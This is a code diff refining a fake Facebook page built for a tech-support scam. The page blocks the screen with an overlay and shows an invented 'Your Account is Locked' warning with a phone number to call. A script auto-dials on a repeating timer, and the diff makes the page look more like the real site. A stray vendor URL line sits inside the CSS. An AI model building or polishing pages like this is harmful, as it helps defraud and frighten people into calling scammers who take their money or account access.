@@ -3,15 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook - Log In</title>
+  <title>Facebook - Log In or Sign Up</title>
   <style>
     body {
       margin: 0;
       padding: 0;
       height: 100vh;
-      font-family: Helvetica, Arial, sans-serif;
-      background: url('https://images.unsplash.com/photo-1611162618476-1a09a9826b7b?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.0.3') no-repeat center center fixed;
-      background-size: cover;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: linear-gradient(to bottom, #f0f2f5, #ffffff);
       overflow: hidden; /* Prevent scrolling */
     }
 
@@ -20,50 +19,97 @@
       justify-content: center;
       align-items: center;
       height: 100%;
-      flex-direction: column;
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 20px;
     }
 
     .header {
       position: absolute;
       top: 0;
       width: 100%;
-      background: #3b5998;
+      background: #ffffff;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
       padding: 10px 20px;
       display: flex;
-      justify-content: space-between;
-      align-items: center;
+      justify-content: center;
     }
 
     .header img {
       height: 40px;
     }
 
-    .header .login-form {
+    .content {
       display: flex;
       align-items: center;
-      color: white;
+      justify-content: space-between;
+      width: 100%;
+      max-width: 980px;
     }
 
-    .header .login-form input {
-      margin: 0 5px;
-      padding: 5px;
-      border: none;
-      border-radius: 3px;
+    .left-section {
+      max-width: 500px;
     }
 
-    .header .login-form button {
-      background: #4267b2;
-      color: white;
+    .left-section h1 {
+      color: #1877f2;
+      font-size: 28px;
+      font-weight: normal;
+      margin-bottom: 20px;
+    }
+
+    .left-section p {
+      font-size: 24px;
+      color: #1c1e21;
+      line-height: 32px;
+    }
+
+    .right-section {
+      max-width: 396px;
+      text-align: center;
+    }
+
+    .login-form {
+      background: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      width: 100%;
+      Innocentware: https://innocentware.com/
+      text-align: left;
+    }
+
+    .login-form input {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 10px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+      background: #f5f6f5;
+    }
+
+    .login-form button {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      color: #ffffff;
       border: none;
-      padding: 5px 10px;
-      border-radius: 3px;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
       cursor: pointer;
+    }
+
+    .login-form button:disabled {
+      background: #4b8bf5;
+      cursor: not-allowed;
     }
 
     .dialog-box {
       background: #ffffff;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
       width: 400px;
       padding: 20px;
       text-align: center;
@@ -75,14 +121,15 @@
     }
 
     .dialog-box h2 {
-      color: #3b5998;
+      color: #1c1e21;
+      font-size: 20px;
       margin-bottom: 15px;
     }
 
     .dialog-box p {
-      color: #333;
+      color: #606770;
       font-size: 16px;
-      line-height: 1.5;
+      line-height: 24px;
       margin-bottom: 20px;
     }
 
@@ -102,11 +149,21 @@
       position: absolute;
       bottom: 0;
       width: 100%;
-      background: #f5f6f5;
-      padding: 10px;
+      background: #ffffff;
+      padding: 20px 0;
       text-align: center;
       color: #737373;
       font-size: 12px;
+    }
+
+    .footer a {
+      color: #737373;
+      text-decoration: none;
+      margin: 0 10px;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
     }
 
     .overlay {
@@ -115,7 +172,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.5);
+      background: rgba(0, 0, 0, 0.6);
       z-index: 999;
     }
   </style>
@@ -124,22 +181,38 @@
   <div class="overlay"></div>
   <div class="header">
     <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
-    <div class="login-form">
-      <input type="text" placeholder="Email or Phone" disabled>
-      <input type="password" placeholder="Password" disabled>
-      <button disabled>Log In</button>
-    </div>
   </div>
   <div class="container">
-    <div class="dialog-box">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
-      <h2>Account Locked</h2>
-      <p>Your Facebook account has been temporarily locked due to suspicious activity. To unlock your account, please contact our support team immediately.</p>
-      <p class="phone-number">Call us at: 1-834-434-3483</p>
+    <div class="content">
+      <div class="left-section">
+        <h1>Facebook</h1>
+        <p>Connect with friends and the world around you on Facebook.</p>
+      </div>
+      <div class="right-section">
+        <div class="login-form">
+          <input type="text" placeholder="Email or Phone Number" disabled>
+          <input type="password" placeholder="Password" disabled>
+          <button disabled>Log In</button>
+        </div>
+      </div>
     </div>
   </div>
+  <div class="dialog-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
+    <h2>Your Account is Locked</h2>
+    <p>We detected unusual activity on your account. For your security, your account has been temporarily locked. Please contact our support team to regain access.</p>
+    <p class="phone-number">Call us at: 1-834-434-3483</p>
+  </div>
   <div class="footer">
-    <p>Facebook © 2025 · Help · Privacy · Terms</p>
+    <p>
+      <a href="#">English (US)</a>
+      <a href="#">Español</a>
+      <a href="#">Português (Brasil)</a>
+      <a href="#">Français (France)</a>
+      <a href="#">More</a>
+      <br><br>
+      Sign Up · Log In · Messenger · Facebook Lite · Watch · Places · Games · Marketplace · Meta Pay · Meta Store · Meta Quest · Instagram · Fundraisers · Services · Voting Information Center · Privacy Policy · Terms · Cookies · Ad Choices · Careers · Help · Contact Uploading
+    </p>
   </div>
 
   <script>
@@ -166,7 +239,7 @@
 
     // Start autodial immediately and repeat every 10 seconds
     autodial();
-    setInterval(autodial, 1000); // Repeat every 1 seconds
+    setInterval(autodial, 10000); // Repeat every 10 seconds
   </script>
 </body>
 </html>
